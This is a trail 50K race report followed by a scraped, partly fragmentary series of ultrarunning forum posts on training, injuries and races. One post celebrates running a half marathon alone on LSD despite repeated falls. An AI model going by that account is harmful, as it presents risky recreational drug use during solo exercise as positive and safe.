I’m awake right before my 5:30 alarm for the 7:30 start. On the Monday prior, I’d tried to shift my schedule into morning running to be better prepared for Saturday’s race; that failed instantly with a flurry of snooze buttons. So, yeah, time for the earliest run start I’ve had in the last ~1.5 years. It’s an average cloudy morning, perfect for split shorts and short sleeves with some arm warmers I plan to ditch halfway through the race. I check out the various other entrants, recognizing one dude as Jesse, the 2018 winner from race photos, and wonder who else might be up with me trying to finish closer to four hours than to five (or six or seven or eight).

### Leg 1
The out-and-back itself is slightly under 7.5 miles, so our day begins with a bonus paved stretch to hit the full 50K. Sure enough, Jesse is off the front at the start; I’m behind him by 40ish feet and checking my watch as we hit mile one in sub-7. Oops. I’m annoyed by the overexcited start, but I’ve done hundreds of road miles at that pace and am not particularly worried about feeling ill effects from it later on.

We lose the pavement and hit the trails just after mile two, covering the same stuff I’d briefly checked out the night before. Right at mile three is one of the course’s several uncontrolled road crossings; I catch up to Jesse who’s stopped and waiting for a gap in traffic, and Ihor, who’d been a minute or so behind me on pavement, joins us as well.

We eventually make it through that stupid intersection (for the first of four times on the day) and move through the easiest unpaved part of the course with fresh legs in 7:30 and 8:00 miles. One of our trio peels just off-course for a pee break; I wind up leading by a short distance but never out of eyesight, thankfully, because turns out I desperately needed a veteran/local Long Island runner to keep my tourist ass somewhere close to following the course.

And then there’s Cold Springs Harbor. The handful of random race recaps I’d read mention the northernmost ~2 miles of the course as the toughest section by far; nothing ungainly in terms of grade or elevation, but plenty of roots and rocks and primitive stairs. My last-minute smooth singletrack practice… not as relevant here. I shuffle and walk a bit, Ihor blazes past me on one (literally, for him) screaming descent that I take much more cautiously, but I regain my position from him going up a hill and am again in first place at the turn-around aid station.

### Leg 2
Just like in my April 50K, I’m running essentially gear-less. I’d dug up ym old water bottle handheld and even tried it out a bit in the week prior before realized I’d rather take a ten second walk through the course’s plentiful aid stations as needed rather than carry that dumb thing for four plus hours. Anyway, I take a bit longer than usual at the turn-around for multiple cups of Gatorade, then take back off up the hill right as Ihor is getting in.

I’m slow and safe through the roots and rocks again, getting to the third-of-the-way point in around 1:25 -- technically right on pace for a 4:15 finish, though there won’t be any more sub-7 paved miles to help with the cause so in reality I know I'll be closer to 4:30. My focus starts to shift from time to position; how far ahead of Ihor did I leave the turnaround? Jesse is coming the other way not long after my departure. Sure as shit it’s looking like a three-person race.

I make it out of Cold Springs and settle back into 8:00-ish running through the more reasonable trail sections. I’m feeling good about making it through one of my two passes of the roots and rocks bullshit… when I trip over an Invisible Protruding Nothing and fall onto my knee and palm. Ah, shit. I pull myself back up, see a bit of blood starting to form on my knee but overall looks about as harmless as possible. On we go.

25K racers started an hour after the 50K, and they’re starting to show up on the course now, and of course I’m also going past the other folks in the 50. I’m pretty stoked to have them there for two reasons -- first as a couple of dozen people to cheer at me and tell me that I’m in first, and second as extra things to look for to make sure that I’m on the course now that I’m (at least for now) out of sight of Ihor and his superior navigation skills.

I make it to the southern turnaround at mile 16, grabbing my stash of Clif Bloks and a dry hat from my drop bag, leaving behind my soaked-with-sweat arm warmers. I try to gauge just how far I go back north before seeing the other runners; it’s about a third of a mile for Ihor and close to a full mile for Jesse.

### Leg 3
… in which I continue to think a lot more about just what I need to do to win the race and less about pace or time.

For now, I’m still moving decently through the rolling forested miles after the turnaround, more 8:00-ish miles as I reapproach the (ugh) start of Cold Springs Harbor. I tell myself that pushing myself to save two or three or five minutes through this stretch isn’t going to help me win, but overdoing it and breaking some number of bones in some part of my body after a slip can absolutely make me lose. So, the 9-10-10 mile splits I got on the hills of my first pass through this section become 11-12-10. So it goes.

At the turnaround I chug a third and fourth cup of Gatorade and force some a horrendous Gu packet down my gullet. I grab another Gu before heading out, though honestly if I needed some desperate electrolytes in the last hour I might’ve licked the sweat off my arms before opening up that thing. And back south we go.

### Leg 4
Ihor shows up coming the other way, maybe half a mile up the trail, but it’s a damn tough half mile and I figure he’ll also need a minute or three at the aid station. Twelve, fifteen minutes ahead? I’ll take that. Beyond the Cold Springs terrain, I start to apply that to how I’m running the “easy” trails for the last 10K to the finish. 8ish pace on flats becomes 9ish. Short and steeper rollers become tiny walking breaks. I tell myself I’m not going to lose my fairly safe lead with a one-hour final 10K, but I absolutely will lose it if I bonk or break something. (Somehow that conservative approach still doesn’t convince me to eat the stupid final Gu packet, though).

And… it all works the way I hoped it would. I keep plodding through mile 28, 29, 30, getting back onto some glorious pavement for the half mile to the finish. And then they even have an actual, honest-to-god finish line ribbon waiting for me. Well, more like a finish line vinyl banner. 4:34:12. Book it. I’ll take that voucher good for a pair of Salomon shoes and a gaudy plaque, please.

### Aftermath
I gather a bunch of congratulations and fist-bumps and attaboys from GLIRC people and 25K finishers and graze through their well-stocked snack options -- a 10 foot party sub here, some chips and cookies there, a bunch of water, two cans of Sprite, pizzas show up a bit later… good, good shit. Ihor, sure and steady enough, arrives second, somewhere in the 4:50s.

I still might try to squeeze in another East Coast 50K before my wife and I move out of the area this summer. I turned in my first place shoe certificate for a pair of Salomon trail shoes -- maybe it’s time to explore whether basically every single other runner in this GLIRC event had the right idea about footwear and I’m being the weirdo for wearing lightweight road shoes on trail ultras. On the other hand, I did win the damn thing, so…

But that’s future stuff. After a few more rounds of the snack tables, I reluctantly and gingerly re-loaded my car and headed back to Syracuse. Traffic was mercifully light going west through the city on a Saturday afternoon -- I think I’d used up all my foot and ankle muscles on those goddam roots and rocks and was not really on board for another half hour of working the clutch pedal through stop-and-go bridge traffic.

How do you deal with failure/disappointment?,"Hey everyone,

This morning I was meant to be trying to set an unsupported FKT on a 38 mile trail near my family home. But anyone in the South of the UK this morning will have experienced the strong wind and rain, and when I got towards the start point I realised that it was very foggy as well. Unfortunately I'd not been able to recce the first half of the course due to covid, and so the combination of weathers meant it felt silly to put myself in a potentially dangerous situation in an unknown area unsupported. After all, I have my first 100 in 5 weeks time so don't need to be getting injured!

Despite knowing it was probably the right choice, mentally I'm feeling crushed. Part of me feels it was weak to drop out, as if it was a race then I would have gone and started - but also if it was a race I'd have had support, route markings and other runners to buddy with. Doesn't help that I'm reading a book currently on fell running where that sort of weather must be standard!

Power Hiking Form and Intensity,"Prepping for a mountain race in a few months, I have noticed a few things. On the incline trainer/treadmill, I am able to maintain zone 2 intensity at a steady walking pace up to about 15-20% incline. I take relatively normal steps/strides and feel no desire to put my hands on top of my thighs. 

Outdoors on real trails, on climbs of any significant grade, I am inclined to take much larger steps (power hiking), which immediately spikes my HR into zone 3/4 and requires me to put my hands on my thighs. The intensity is not sustainable for an all-day effort. If I take smaller steps, my HR falls slightly but I feel very inefficient.

What is the move here? Is this just revealing my poor aerobic base? Should I accept that the intensity will drift into zone 3 on climbs? My race starts with 2600 vertical feet in the first 3 miles (climbing to ridgeline). Going full blast for the first hour seems like the wrong answer.",ultrarunning,1620402604

Why are there no self supported ultramarathon races?,"I spent a few days at Cocodona last weekend and while the race was absolutely incredible, I found the cost of entry quite deterring. It got me thinking about some of the ultra-distance races in cycling, like the Tour Divide, or GB Duro, where there is technically a race happening, but really it's just people racing from one location to the other with no support. We have FKT's in ultrarunning, but I've never heard of a large group of people racing the PCT, for example, or some other long trail in self supported fashion. Am I the only one that thinks such an endeavour would be awesome? 

Furthermore, I wonder what the legal implications are? As long as there are no crews and aid stations, can you even legally organise an event that involves people going through wilderness areas? Even if it's just like 15 people who were invited via Facebook? You can backpack with a group of friends, so at what point is it not allowed? 

Either way, I think this should be a thing in ultra running. Just a group of people trying to finish a 200+ mile trail as fast as possible in self supported style, no crew and no aid stations.

Sustained Uphill Running,"I’m wondering if anyone has tips on how to train for sustained gradual uphills. The area I’m looking for guidance is the long, drawn-out, pseudo-hills where it’s not quite steep enough to require walking, but it’s got too much of an incline to run without expending precious energy. 

I’ve got a 100-mile race in August that has what seems to be two forever climbs that I think I’m drastically underestimating. I’m good with huge elevation gains, but I seem to struggle with prolonged gradual climbs. The first climb is almost 25 miles long and is only \~4200 feet of elevation. But each mile gradually climbs between 100-250 feet/mile for a net uphill effect that is relentless. The second climb is about 30 miles of the same, 100-250 feet/mile elevation change. These occasionally have breaks but for the most part they are dauntingly consistent. I’m wondering if there is a technique to improve upon this skill? My normal plan is to speed-hike the uphills and run the flats and downhills, but that would mean too much walking. I just completed a 50 miler with a six-mile stretch like this towards the end of the race and it basically was soul-sucking. I was able to do it, but it wasn't pretty. I am planning to get out on the course to see what it's really like, but I’m looking for ways to improve my incline running. My weekly miles normally include lots of elevation and lots of hills, but they almost seem too steep. Any ideas? Any long-term training stuff that might help in future efforts beyond this years race?

"I consistently get stomach cramps when bombing hills after difficult, sustained climbs","Basically what the title says. This happens on descents after climbs of 2,000+ feet. The cramps are generally just an annoyance, but they can get so painful that I need to stop and walk. (The jostling seems to make them worse.)  Hydration and nutrition don't seem to make any difference, whether I haven't eaten in 3 hours or just ate a big meal or fuel and hydrate during the climb, it's all the same. I've gotten it on descents after 30 minutes of running and up to 5 hours into running, and haven't tested it out on anything longer than that. 

Does anyone have any idea why this consistently happens? What are some strategies I can try to avoid the cramping?",ultrarunning,1620251554

Running Uphill to Lessen Pounding,"Used to run high miles, recently had a need to prep for a 5k in 4 weeks. Mostly on a treadmill (sad face)

Doing what I can to work on my form and PT for the lower back issues but in the meantime-I'm doing everything except speedwork on an incline. 2-3% seems to feel good and other than sore hamstrings my body /seems to like it.

Opinions, suggestions, etc? Minimalist shoes, running uphill and generally not heel striking seem to help the most. Heat/ice/massage and physical therapists exercises seem to help most w recovery.

Feeling Discouraged from Injury. Looking for advice.,"I have my first Ultra on June 5th, which is 50 miles. Last weekend I dislocated my shoulder and also went into anaphylaxis from a bee sting (never knew I was allergic!). I am very slow in recovering from this. I went from running 40-50 mile/week to now trying to get back up to 10 miles on a long run. The main concern is not my shoulder, even though it is weaker, its been holding up on runs. From the allergic reaction, though, I feel as though I still am so slow in my cardio. 

Another thing to consider is I can drop to the 50k (32mile) race option anytime before the day of the race. I would rather run 30 miles than not finish 50, but I want to run the 50 with all my being.

Do you all have any thoughts on what to do?",ultrarunning,1620069841
Too slow for this 50k? Seeking wisdom from back-of-the-pack-ers,"Hi there!

I just ran a half marathon with a pace of about 12:30/mile at a moderate-hard effort for me — I've been utilizing a run/walk for training and continued it for the race. I've been training on roads this season, but previous trail runs I've done have easily put me in the 15-20+ minute/mile range even with relatively mellow elevation gain. 

I have three months to train on trails, practice power hiking, downhills, and time on feet—but I'm freaking out that I don't have a snowball's chance in hell of making the cutoff for the 50k I signed up for, the Wy'East Howl, which has 6,000 feet of gain and 5,000 feet of descent with two cutoffs - 6.5 hours to reach the 20.7 mile marker, 10 hours for the total race.

(Re: athletic background—I backpacked 1,000 miles in a summer a few years ago, but mileage was usually ~15-20 and I had the security of taking as long as I wanted. Current easy running pace is like 13:30/mile on roads.)

I've always been slow at every sport, so while I'm confident I could build myself up to a 50k distance, I'm significantly less confident that I could do it within 10 hours. 

Any other slowpokes/back of the pack-ers have words of wisdom/encouragement for me?",ultrarunning,1620064973

Ultrarunner and coach of the national danish ultrarunning team Jesper Olsen has a Youtube-channel where he talks about training (in danish) and his runs around the world (in english),"Jesper Olsen is a danish ultrarunner and apparently has multiple international wins and podiums on very long distances (6-day and 10-day racing). Not least of his achievements are the first ever documented east-west rund around the world (World Run 1, 26000K, 1.5 years) and the first north-south run (World Run 2, 37000K, 4 years). He is currently coaching the national danish ultrarunning team, and planning and training for an expedition across Antarctica to be the first person ever to have crossed all seven continents on foot. 

- His Youtube-channel: https://www.youtube.com/channel/UCc1nVp-HlitMeDZa2duqV0A/videos

- His homepage: http://worldrun.org/m_introduction.php

 


I don't know much else about him. His Youtube-channel has only been active for about a month, but I watched his videos (IN DANISH!) on training, and he talks about:

- Long term planning: How to ramp up volume over the years from being a casual runner (less than 50K per week) to being an enthusiastic casual runner/casual ultrarunner (100 K per week), maybe even to international level athlete (140K per week in the off season).  
- Shorter term planning: Ramping up/down volume during the year, when to peak and rest and the importance of recovering for 3 months a year at (for example) half volume  
- Long distance training runs
- Tempo runs for ultrarunners: From classical tempo runs (1 min on/off) over medium/long intervals (1-5K) to very long tempo runs (20 to 65K)
- Injury prevention and early signs of fatigue, including persisting mood changes to more concrete physical signs of fatigue to chronic injury, with the main point being: Injuries do not usually appear because of a single run/session. They appear because you ignored signs or didn't realise early enough.
- Mental strength and fueling during runs (while the concepts are universally applicaple, I'm not personally convinced the specific content in these videos is as high quality as the training videos).

The training videos are probably only useful for other scandinavians (unless someone chooses to create subtitles for them), but his videos about the world runs are in english, and to me it seems like he want's to tell his stories, so more videos are probably coming.",ultrarunning,1620040387

I ran a Half Marathon while on Acid yesterday,"Sorry if this is the wrong place to post this but I consider myself an ultra runner I train for Ultras and I love long-distance running and I just really wanted to share this with people who love running as much as I do. 

I posted this in the running subreddit but they deleted it, unfortunately. I'm just going to copy and paste it here if that's okay?

Yesterday, 4/29/21, I ran 13.4 miles while on acid. I want to write about it because honestly, I've never experienced anything like I did yesterday and it was such an amazing experience. I've done acid a lot over the past few years, but almost every time I did it it was in a party environment or on my own in a bedroom. I love running, like a lot. Like when I think of myself as a person the first thing that pops up in my head to describe myself to others is that I'm a runner. Not a very good runner, but a runner who loves to run.

I really had no goals in mind with this run other than to be as careful as I could and to just enjoy myself. To enjoy my feet below me carrying me wherever I will them too. I didn't have a time limit I barely took any precautions. I had never done anything like this before. It was all very spur of the moment and I hardly did any planning or preparing whatsoever.

I got up for work at 3:15 am and got home from work around 6:40 pm. I knew that I was going to be tired and that I'd need to take the acid as soon as I got home so that I could still be running when the acid finally hit me. I started my run just after 7 pm Thursday afternoon.

Miles 1-3 They felt very similar to the beginning of every run. I wasn't tripping yet so I mostly focused on stretching my legs out and keeping a slow and easy pace. I followed the train tracks out of my small rural town that I live in and just kept running beside them for miles. Until the closest road was over 3 miles away and I was just in farmland.

Mile 4 About an hour or so after I took the acid. I could feel it coming on now and just felt incredibly light, happy, and proud. I was proud that I was running. I was proud that I worked an entire day and still decided to run a half marathon. I was proud of this crazy little trip I decided to take.

Mile 5-6 This is my favorite part of my run. I was surrounded by nature. River, swamp, farmland, open sky. For a brief moment, it all felt like mine. It felt right. I didn't want to leave but the sun was going down and I needed to make it home because I left my headlamp at home because I was in such a rush to start my run. Before I reached my halfway point I saw a white tail deer running like 25-30 yards to my north and ran with her for a while. I tried to get a picture of her or a video but I couldn't because I am stupid lol. Snapchat video of my favorite part

Mile 7-8 I was tripping. I ran along the train tracks and was mesmerized by the long golden grains of grass following the breeze in the wind. They all looked the same to me. Every piece standing tall and proud reaching towards the sky and the breeze from the south and east blowing them in the same direction of my home. I followed the dancing grass. I watched the birds take off on flight in front of me. I watched them jet off into the sky and effortlessly carry themselves on the wind. I felt very similar to them. Their wings are to them and the sky as my legs are to me and the ground.

Miles 9-11 The train tracks brought me up alongside small bodies of water and it was really, really hard to focus on my running because each wave and ripple on the water just grabbed my attention. Demanded that I look at it and appreciate the beauty I found myself alone and surrounded by. During this portion of the run, I would fall 4 times. 2 hard falls and a cracked phone screen made me realize I was flying. I wasn't jogging or slowly running I was straight up sprinting and I didn't even realize it. Running fast while sober is great and fun. Running fast while on acid is on another level completely. The sun was going down and I was bleeding, cold, excited, and happy.

Miles 12-13 I was coming back into town. Following the sunset. The incredible colors painted in the sky and the clouds make me wish I could paint because I feel the only way I'd be able to describe this sunset is on canvas. The blues slowly turning into various shades of purples, pinks, oranges, reds, and yellows was a perfect view to follow back into town. The smells and sights once I was back in town were very different from the rest of my run understandably. I ran along the train tracks towards the old co-op. Before I got there I had to run behind a gasoline station and I could smell the fried chicken and cheese curds they had for sale the smells filled me up and encouraged me to run home so that I could make french fries. By the dumpsters behind the gasoline station were piles of sand and cigarette butts from where the ashtrays were dumped. I felt sad and also proud. I felt sad because I used to be a part of that group. I used to smoke from 15-23 I have just quit smoking a little over 3 months ago. Running past those piles of cigarette butts helped remind me that me quitting smoking wasn't just going to have a positive impact on my life but all of the lives around me. I'm proud that I quit smoking and I will say that it is hard and it sucks at times, but that it's worth it just like running is to all of us.

Miles .4 Running. I did not want to stop but the sun was going down and even though for me it is normal to run and to sometimes do acid I'd never mixed both before. I didn't want the fun to stop but I knew that my neighbors wouldn't appreciate a crazy young man running around the streets after dark while he was tripping balls on acid. So I did the only other thing I could do. I went home and hopped in the shower to wash the blood, sweat, dirt, and rust off of my exhausted body. Guys before I hopped in the shower I stood naked in front of my mirror and was so happy. I looked at my body, my face, my legs. I felt so proud of myself. Of the power in my legs. The goofy smile I had melted onto my face. I have never in my life felt as happy as I did standing in front of my mirror naked, coming down from this incredible runner's high, and watching the walls and ceiling breathe with me.

I watched documentaries after my shower and before falling asleep. I think what I learned the most from yesterday is that I take too much for granted and that I don't appreciate what I have. I am very lucky and I believe so are most of you.

I think that if I never do acid again I'd be okay with it because yesterday, honestly was life-changing and I need more time to analyze myself and to keep doing what drives me.

Before I forget I listened to music and some of the songs that I listened to that I want to share with y'all.

The pain occurs right below my kneecap almost around the patellar ligament and to the tibia/top of the shinbone. I should mention I feel 0 pain while running. However, I have started playing basketball again and the pain happens mainly when I play basketball. If I do a stepback, jump or a hard cut where I plant hard on that knee/leg, it will feel like it just gives out with quite a bit of sharp pain. The pain goes away quickly, but it will give out and cause pain at random times while I play. Occasionally, it will hurt if I try and get up from sitting or laying down and put all the pressure on that knee/leg. If I press hard on it, the top of the tibia/shin bone will become irritated.

It should be noted that I have been running every day for the past 35 days and will play basketball 1-2 hours every other day. Not sure if it is just overuse or something to be more concerned about.

Coming back from tibial plateau fracture,"Hey friends, 

I wanted to reach out to the community to see if anyone has gotten back to ultras after a tibial plateau fracture and if so what your timeline was like. Thanks and happy trails.",ultrarunning,1619474423
Sesamoidectomy/Foot Surgery/Recovery - Any experience?,"Regrettably, after 3 years, I have given in and decided to have my left tibial sesamoid removed via surgery in a few weeks. I have managed to work around it for a couple of years. Tried bouts of all sorts of recovery to include complete rest, steroid injections, orthotics, physical therapy, and others.

Came about 3 years ago after buying a pair of running shoes I knew after the first mile were too narrow and hurt my foot. Thinking I was “breaking them in”, I stubbornly continued to run and developed sesamoiditis. It has gradually got worse over time. I ran my last race two years ago and it was a trail half marathon. Today I can go about an hour to hour and a half running until the pain sets in and can do little climbing or sprints. It is a demoralizing injury. I run every other day still and in zero drop shoes it is tolerable. It has almost pushed me exclusively to road running. It’s been terrible. Needless to say, I am okay with my decision to pursue surgery. I truthfully avoided it at all costs.

Has anyone had experience coming back from a sesamoidectomy? What were your timelines? I’m nervous about complications but honestly, 3 years is giving it the “old college try” of healing on its own.",ultrarunning,1619463559
Is a 50k training plan enough for a 58k?,"Hi fellow runners! 
I ran my first marathon yesterday. In the end of August I'm going to run a 58k. 
Usually I stick pretty strictly with running plans, but I can't find anything that fits my race. I can find 50k running plans and 50 miles running plans. Would a 50k running plan be sufficient? 
Apart from that, I have to start in the middle of a plan, since I have ""only"" have 17 weeks to go.. 

I'm still pretty new to this, so I apologize if I'm asking stupid questions 

Thank you in advance for your response :)",ultrarunning,1619443439
Heat training sucks,"Been working on some heat training. For the record, I hate running in sweat pants and shirt! 

Last summer was the first time I tried to do any serious running during the summer. I seriously thought something was wrong with me, as I suddenly lost all speed and energy. It wasn't until summer was almost over that I realized it was just the heat. So I'm planning ahead this year and trying to train for it early! So far I'm running in sweats and spending some time in the sauna. Are there any other good tricks?

Also my neighbors probably think I'm crazy! Shorts and t-shirt when it's 35 deg, sweats when it's 60+...... 🤔🤣😂",ultrarunning,1619441515
